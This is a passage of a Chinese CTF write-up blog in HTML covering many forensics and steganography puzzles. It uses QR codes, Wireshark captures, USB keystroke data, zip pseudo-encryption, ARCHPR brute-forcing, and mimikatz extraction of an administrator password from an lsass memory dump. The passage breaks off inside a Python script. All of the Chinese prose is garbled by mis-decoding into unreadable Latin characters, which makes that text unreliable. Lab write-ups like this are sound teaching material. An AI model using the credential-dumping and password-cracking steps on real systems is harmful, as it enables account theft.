class="line">JkBPPR6MrYwXmsMCMz67DN&#x2F;k5u1NYw9ga53a83&#x2F;B&#x2F;t2G9FkG&#x2F;IITuR+9gIvr&#x2F;LEdd1ZRAwUEAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>å°†å…¶è§£ç åä¿å­˜å‘ç°æ˜¯ä¸ªéœ€è¦å¯†ç çš„å‹ç¼©æ–‡æ¡£ã€‚å›åˆ°æ–‡æ¡£ä¸­æ‰¾æç¤ºï¼Œå‘ç°äº†äºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892941049/963b3e68669a4c3b7f2b03e567d829faaf353c2e.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893076228/1d26b9bd68f66d9be54d0d596ad4e8af38d70d37.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893188142/8777be83816db551ca0ee7928abac42e23deb5f7.png"></p><p>ç¨å¸¦å¤„ç†åæ‰«æå¾—å‡º <code>i</code> <code>play</code> <code>ctf</code> çš„å­—æ ·ï¼Œæ‹¼æ¥å‘ç°ä¸å¯¹ï¼Œä½†æ˜¯å®åœ¨æ‰¾ä¸åˆ°äº†ï¼Œä¸Šç½‘çœ‹äº†ä¸€æ³¢ WriteUp å‘ç°è¿˜æœ‰ä¸ª <code>want</code>ï¼Œäºæ˜¯æˆåŠŸè§£å‹ï¼Œå¾—åˆ°äº† flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roarctf&#123;CTF-from-RuMen-to-RuYuan&#125;</span><br></pre></td></tr></table></figure><h3 id="é—´è°å¯ç¤ºå½•"><a href="#é—´è°å¯ç¤ºå½•" class="headerlink" title="é—´è°å¯ç¤ºå½•"></a>é—´è°å¯ç¤ºå½•</h3><p>æŒ‚è½½ç£ç›˜åˆ°æœ¬åœ°ï¼Œå‘ç°ä¸€ä¸ª exeï¼Œæ ¹æ®æš—ç¤ºè¿è¡Œä¸€æ¬¡ exeï¼Œå‘ç°æ˜¯è‡ªè§£å‹ï¼ŒåŒæ—¶ç”Ÿæˆäº†ä¸€äº›æ–‡ä»¶ï¼Œå…¶ä¸­çš„æŸä¸€äº›è¢«è§£å‹åè„šæœ¬åˆ é™¤äº†ã€‚äºæ˜¯ä¸ç”¨è‡ªè§£å‹ï¼Œç›´æ¥ 7-zip æ‰“å¼€ï¼Œå‘ç°æœ‰ä¸ª flag.exeã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893373042/c3b6e2516eb132f7392c857234f71b258dae686a.png"></p><p>è§£å‹å‡ºæ¥è¿è¡Œä¹‹åå³ä¼šç”Ÿæˆ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;379:7b758:g7dfe7f19:9464f:4g9231&#125;</span><br></pre></td></tr></table></figure><h3 id="æˆ‘åƒä¸‰æ˜æ²»"><a href="#æˆ‘åƒä¸‰æ˜æ²»" class="headerlink" title="æˆ‘åƒä¸‰æ˜æ²»"></a>æˆ‘åƒä¸‰æ˜æ²»</h3><p>ç”¨ 010 editor æ‰“å¼€è§£å‹çš„å›¾ç‰‡ï¼Œå‘ç°åœ¨æ–‡ä»¶å°¾éƒ¨æœ‰ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œåé¢æ¥ç€å¦ä¸€å¼ å›¾ç‰‡ã€‚å›¾ç‰‡æå–å‡ºæ¥ä¹‹åæ˜¯ä¸€å¼ æœ´å®çš„ä¸‰æ˜æ²»å›¾ç‰‡ã€‚å­—ç¬¦ä¸²ç”¨ base32 è§£ç ä¹‹åå³ä¸º flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893662469/380a7955e772bd0191f7d079599dc1b7eb01c17d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6f1797d4080b29b64da5897780463e30&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single dog</h3><p>010 editor æ‰“å¼€æ–‡ä»¶å¯ä»¥å‘ç°å¾ˆå¤šæ–‡ä»¶ï¼Œforemost åˆ†ç¦»ä¸€ä¸‹å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚å‹ç¼©åŒ…ä¸­æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œå…¶ä¸­æ˜¯ aaencode çš„ä»£ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893815181/4ed8c78cfa6e72627e3d7c42a7862022b50c7499.png"></p><p>å°†ä»£ç å¤åˆ¶åˆ°å·¥å…·ä¸­è§£å¯†å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=<span class="string">&quot;SUCTF&#123;happy double eleven&#125;&quot;</span>;</span><br><span class="line">alert(<span class="string">&quot;åŒåä¸€å¿«ä¹&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;happy double eleven&#125;</span><br></pre></td></tr></table></figure><h3 id="V-amp-N2020-å…¬å¼€èµ›-æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤"><a href="#V-amp-N2020-å…¬å¼€èµ›-æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤"></a>[V&amp;N2020 å…¬å¼€èµ›]æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤</h3><p>æ‰¾å¼€æ”¾çš„ç«¯å£ï¼Œæ¢ç§æ€è·¯ä¹Ÿå°±æ˜¯æ‰¾æœ‰å“åº”ä¸”å»ºç«‹è¿æ¥çš„ç«¯å£ã€‚æ‰“å¼€ Wiresahrk åˆ†ææµé‡åŒ…ï¼Œç­›é€‰ <code>tcp.flags == 0x010 || tcp.flags == 0x02</code> æ‰¾åˆ°å…¨éƒ¨ TCP å»ºç«‹è¿æ¥ä¸ç›¸åº”çš„æ•°æ®åŒ…ï¼Œæ‰¾åˆ°äºŒè€…äº¤æ›¿å‡ºç°çš„ç«¯å£ï¼Œå³ä¸ºå¼€æ”¾çš„ç«¯å£ã€‚ç­›é€‰ä¹‹åæ‰¾å‡ºä»¥ä¸‹ç«¯å£ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">21</span><br><span class="line">22</span><br><span class="line">631</span><br><span class="line">801</span><br><span class="line">3306</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºå¯çŸ¥ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;21226318013306&#125;</span><br></pre></td></tr></table></figure><h3 id="å®‰æ´µæ¯-2019-å¹ç€è´æ–¯æ‰«äºŒç»´ç "><a href="#å®‰æ´µæ¯-2019-å¹ç€è´æ–¯æ‰«äºŒç»´ç " class="headerlink" title="[å®‰æ´µæ¯ 2019]å¹ç€è´æ–¯æ‰«äºŒç»´ç "></a>[å®‰æ´µæ¯ 2019]å¹ç€è´æ–¯æ‰«äºŒç»´ç </h3><p>è§£å‹å¾—åˆ°ä¸€å †å›¾ç‰‡å’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå°†äºŒç»´ç æ‹¼å¥½ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893999854/eb67b50dc15350f763caa25580c825431cef3c2f.png"></p><p>æ‰«æäºŒç»´ç å¾—åˆ°ä¿¡æ¯ <code>BASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32</code>ã€‚å°†å‹ç¼©åŒ…å¤‡æ³¨å–å‡ºï¼ŒæŒ‰ç…§å¦‚ä¸Šæ­¥éª¤å€’åºæ“ä½œï¼Œå¾—åˆ°äº† <code>ThisIsSecret!233</code>ã€‚å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Qr_Is_MeAn1nGfuL&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»å¨ƒå¨ƒæŠ“èµ·"><a href="#ä»å¨ƒå¨ƒæŠ“èµ·" class="headerlink" title="ä»å¨ƒå¨ƒæŠ“èµ·"></a>ä»å¨ƒå¨ƒæŠ“èµ·</h3><p>æ ¹æ®æç¤ºå¯çŸ¥ï¼Œç»™å‡ºçš„å¯†æ–‡ä¸ºä¸¤ç§æ±‰å­—ç¼–ç ï¼Œå››ä½æ•°å­—æç»˜ä¸€ä¸ªæ±‰å­—çš„å¤§æ¦‚å°±æ˜¯æ ‡å‡†ä¸­æ–‡ç”µç ã€‚å¯¹åº”è§£å¯†ä¹‹åä¸ºå¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894085870/367b2037566bb78374d1e5336b27138d2d2194bb.png"></p><p>å‰©ä¸‹çš„è‹±æ–‡å­—ç¬¦æç»˜æ±‰å­—çš„ç¼–ç è”ç³»åˆ°å„ç§è¾“å…¥æ³•ï¼Œå®¹æ˜“çŒœæƒ³åˆ°æ˜¯äº”ç¬”è¾“å…¥æ³•ï¼Œå°†å…¶è½¬æ¢åå¾—åˆ° <code>ä¹Ÿè¦ä»å¨ƒå¨ƒæŠ“èµ·</code>ã€‚å†æ ¹æ®æç¤ºå°†ä¸Šè¿°å†…å®¹æ‹¼æ¥åè½¬ä¸º MD5ï¼Œå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3b4b5dccd2c008fe7e2664bd1bc19292&#125;</span><br></pre></td></tr></table></figure><h3 id="å°æ˜“çš„Uç›˜"><a href="#å°æ˜“çš„Uç›˜" class="headerlink" title="å°æ˜“çš„Uç›˜"></a>å°æ˜“çš„Uç›˜</h3><p>ç¬¬ 32 ä¸ªå‰¯æœ¬ exe æ”¾åˆ° IDA é‡Œçœ‹å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894226960/6b64203624ef232e93c2534a99052a0b57905076.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;29a0vkrlek3eu10ue89yug9y4r0wdu10&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTFæ–°ç”Ÿèµ›2020-swp"><a href="#ACTFæ–°ç”Ÿèµ›2020-swp" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]swp"></a>[ACTFæ–°ç”Ÿèµ›2020]swp</h3><p>Wireshark æ‰“å¼€æµé‡åŒ…ç­›é€‰ http æ¡ç›®ï¼Œåˆ†ç¦»å‡º secret.zipï¼Œæ ¹æ® hint.html çš„å†…å®¹å¾—çŸ¥å‹ç¼©åŒ…æ˜¯ä¼ªåŠ å¯†ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894318623/e14761894f0093a8f810868c13ad1ac6fe816fa9.png"></p><p>ä¿®æ­£å‹ç¼©åŒ…ä¼ªåŠ å¯†ï¼Œè§£å‹ä¹‹åç”¨ 010 editor æ‰“å¼€ .swp æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥æ‰¾åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894434296/26744d28396c4eeacd5b273b2d4502136b184264.png" alt="image-20210127175642551"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;c5558bcf-26da-4f8b-b181-b61f3850b9e5&#125;</span><br></pre></td></tr></table></figure><h3 id="ç™¾é‡ŒæŒ‘ä¸€"><a href="#ç™¾é‡ŒæŒ‘ä¸€" class="headerlink" title="ç™¾é‡ŒæŒ‘ä¸€"></a>ç™¾é‡ŒæŒ‘ä¸€</h3><p>Wireshark æ‰“å¼€æ•°æ®åŒ…ï¼Œå‘ç°å¾ˆå¤šå›¾ç‰‡æµé‡ï¼Œä½¿ç”¨æ–‡ä»¶&gt;å¯¼å‡ºå¯¹è±¡å°†æ•´ä¸ª HTTP å¯¹è±¡å¯¼å‡ºï¼Œåœ¨å›¾ç‰‡æ–‡ä»¶çš„å¤‡æ³¨ä¸­å¯ä»¥å‘ç°ä¸€åŠ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894551843/77d9f83a4679a149b671f921bdceb1872b60750f.png"></p><p>æ ¹æ®æ–‡ä»¶åå†å»è¿½è¸ªå¯¹åº”çš„ TCP æµï¼ŒçŒœæµ‹å‰©ä¸‹çš„éƒ¨åˆ†ä¹Ÿå­˜åœ¨ Exif ä¸­ã€‚è·Ÿè¸ªåˆ° TCP æµ 114ï¼Œå¯ä»¥åœ¨ Exif ä¸­æ‰¾åˆ°å‰©ä¸‹åŠä¸ª flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894688529/154cccf76a03fab4c456e19c5bc0097bbe70fc01.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h3><p>010 æ‰“å¼€ boki.jpgï¼Œå‘ç°å…¶å°¾éƒ¨æœ‰å‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894805766/03b57f6dea6ee25a8ddc3b1589ea8310e8b1b12c.png"></p><p><code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ï¼Œä½¿ç”¨ ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  888866ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894941454/34b89f8ed8ecd23f89ab3bcec39c9996b5c11a3a.png"></p><p>è§£å‹åå¾—åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œå†…å®¹æ˜¯ <code>WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09</code>ã€‚ä¸‰é‡ base64 è§£å¯†ä¹‹åå¾—åˆ° <code>killerqueen</code>ã€‚</p><p>ç›´æ¥æŠŠå®ƒä½œä¸º flag å‘ç°å¹¶ä¸æ­£ç¡®ï¼Œäºæ˜¯çŒœæµ‹ä¸º keyï¼Œå°è¯•å¯¹ jljy.jpg è¿›è¡Œ outguessï¼Œå¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895062878/6099930a54e808a08e7ea5f232c7cd6cf946ad0d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;pretty_girl_alison_likes_jojo&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h3><p>é¦–å…ˆä½¿ç”¨ ARCHPR çˆ†ç ´ 222.zipï¼Œå¾—åˆ°å¯†ç  723456ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895185270/1bf06c47dbe9af1d994e84e3332447d28454e287.png"></p><p>è§£å‹ä¹‹åå¾—åˆ° 111.zipï¼Œä¿®æ­£ä¼ªåŠ å¯†ä¹‹åè§£å‹å‡º flag.zip å’Œ start.shï¼Œæ ¹æ®è„šæœ¬å†…çš„å†…å®¹å¯çŸ¥ flag.zip çš„å¯†ç ä¸ºå‡ºé¢˜æ—¶çš„æ—¶é—´ã€‚ç»“åˆ 111.zip å’Œ flag çš„ä¿®æ”¹æ—¶é—´ç¡®å®šèŒƒå›´ï¼Œä½¿ç”¨ ARCHPR çˆ†ç ´å‡ºå¯†ç ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">zip -e --password=`python -c <span class="string">&quot;print(__import__(&#x27;time&#x27;).time())&quot;</span>` flag.zip flag</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895324079/ecc5a0788351cdd647c34d37b3a13596b8140c43.png" alt="image-20210127184534823"></p><p>è§£å‹ flag.zip å°±å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fkjabPqnLawhvuikfhgzyffj&#125;</span><br></pre></td></tr></table></figure><h3 id="å®‰æ´µæ¯-2019-Attack"><a href="#å®‰æ´µæ¯-2019-Attack" class="headerlink" title="[å®‰æ´µæ¯ 2019]Attack"></a>[å®‰æ´µæ¯ 2019]Attack</h3><p>Wireshark åˆ†ææ•°æ®åŒ…ï¼Œä»æ•°æ®æµä¸­åˆ†ç†å‡ºåŒ…å« flag çš„å‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895442745/1d900fe91fdbdbbd1c55125fc79ba96b1d652193.png"></p><p>æ ¹æ®å‹ç¼©åŒ…æ–‡æ¡£å¤‡æ³¨ï¼Œå¾—çŸ¥éœ€è¦æ‰¾åˆ° administrator çš„å¯†ç ï¼Œäºæ˜¯ä»æ•°æ®åŒ…ä¸­å¯¼å‡º lsass.dmpï¼Œä½¿ç”¨ mimikatz æå–å‡ºå¯†ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895614694/cb4b3f805db658196cb007cbd76176dd3373442d.png"></p><p>ä½¿ç”¨æå–å‡ºçš„å¯†ç  <code>W3lc0meToD0g3</code> è§£å‹å‹ç¼©åŒ…å³å¾—åˆ° flag æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;3466b11de8894198af3636c5bd1efce2&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒç»´ç -1"><a href="#äºŒç»´ç -1" class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h3><p>ç®€å•å¾—æ‹¼ä¸€ä¸‹ï¼Œç„¶åç”¨å¾®ä¿¡æ‰«å³å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213896385819/9662327b220303d070e87cf7ef1c55e579bd0c83.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7bf116c8ec2545708781fd4a0dda44e5&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-çˆ¬"><a href="#WUSTCTF2020-çˆ¬" class="headerlink" title="[WUSTCTF2020]çˆ¬"></a>[WUSTCTF2020]çˆ¬</h3><p>010 editor æ‰“å¼€æ–‡ä»¶åç¡®å®šä¸º pdf æ–‡ä»¶ï¼Œä¿®æ­£æ‹“å±•åã€‚ä½¿ç”¨ Acrobat DC æ‰“å¼€ pdf æ–‡ä»¶ï¼Œæ ¹æ®æç¤ºå°†å›¾ç‰‡ç§»å¼€ï¼Œå¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213896689503/7335110b7a8f63c201cc032348b12ce6631e4bbd.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°å›¾ç‰‡ä¸­çš„æ–‡å­—æå–å‡ºæ¥ï¼Œåˆ©ç”¨åå…­è¿›åˆ¶è½¬ ASCII å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h3><p>è§£å‹å¾—åˆ°ä¸€æ®µéŸ³é¢‘ï¼Œå¬äº†ä¸€æ®µä¹‹ååˆ†è¾¨å‡ºæ˜¯ DTMFã€‚å°è¯•ä½¿ç”¨<a href="http://dialabc.com/sound/detect/index.html">åœ¨çº¿è§£å¯†å·¥å…·</a>è§£å¯†ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897168221/943620635cbac51389d91f7b20c82c99c0253b0d.png"></p><p>å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999*666*88*2*777*33*6*99*4*444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹åº”æ‰‹æœºä¹é”®è¿›è¡Œè§£å¯†ï¼Œå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUAREMXGIRLFRIENES</span><br></pre></td></tr></table></figure><p>å¯¹å†…å®¹è¿›è¡Œä¿®æ­£å¹¶çŒœæµ‹ï¼Œå°±å¯ä»¥å¾—å‡º <code>youaremygirlfriends</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;youaremygirlfriends&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h3><p>è¿è¡Œç¨‹åºä¹‹åæç¤ºæ£€æµ‹æ—¶é—´ï¼Œäºæ˜¯æŠŠç³»ç»Ÿæ—¶é—´æ›´æ”¹åˆ°ä¸€è‡´å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897335630/7964fe57a84e3ef15959a999c552a83d5db6976d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;We1cOm3_70_cyber_security&#125;</span><br></pre></td></tr></table></figure><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>binwalk å‘ç°è§£å‹å‡ºæ¥çš„æ–‡ä»¶ä¸­æœ‰å‡ ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œ<code>binwalk -e</code> æå–å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897426152/b04439c8c5d8ecadccecb23cd0d05bd4469320d9.png"></p><p>å¾—åˆ°äº†ä¸€ä¸ª USB æµé‡çš„æµé‡åŒ…ï¼Œä½¿ç”¨ <code>&quot;D:\Program Files\Wireshark\tshark.exe&quot; -r key.pcapng -T fields -e usb.capdata &gt; usbdata.txt </code> åˆ†ç¦»å‡º USB çš„ Leftover Capture Dataï¼Œä½¿ç”¨ UsbKeyboardDataHacker æ¥è¿›è¡Œåˆ†æï¼Œå¾—åˆ°å¦‚ä¸‹å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;</span><br></pre></td></tr></table></figure><p>ç”± RAR æ–‡ä»¶ç»“æ„å¯çŸ¥å…¶ HeadType åº”ä¸º <code>0x74</code>ï¼Œå°†å…¶ä¿®æ­£ä¹‹åè§£å‹å‹ç¼©æ–‡æ¡£ï¼Œå¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897837158/5bf7411965ba956b3a9d0a59b8b022b0f79a5148.png"></p><p>StegSolve å¯è§£å‡ºä¸€å¼ äºŒç»´ç ï¼Œæ‰«æå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ci&#123;v3erf_0tygidv2_fc0&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ <code>xinan</code> ä¸ºå¯†ç ï¼Œä½¿ç”¨ VigenÃ¨re Decode å¯¹ä¸Šè¿°å†…å®¹æ“ä½œï¼Œå†ç”¨ä»¥ 2 ä¸ºå¯†é’¥çš„æ …æ å¯†ç è§£å¯†å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897930952/07f0c4047661bf5e65335ed8a9a5d6079975677d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;vig3ne2e_is_c00l&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h3><p>TTL çš„é¢˜ç›®ï¼ŒæŠŠç½‘ä¸Šçš„è„šæœ¬ç¨å¾®æ”¹ä¸€ç‚¹ï¼Œå¯ä»¥æå–å‡ºä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ttl.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">n_num = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27;\n&#x27;</span>:</span><br><span 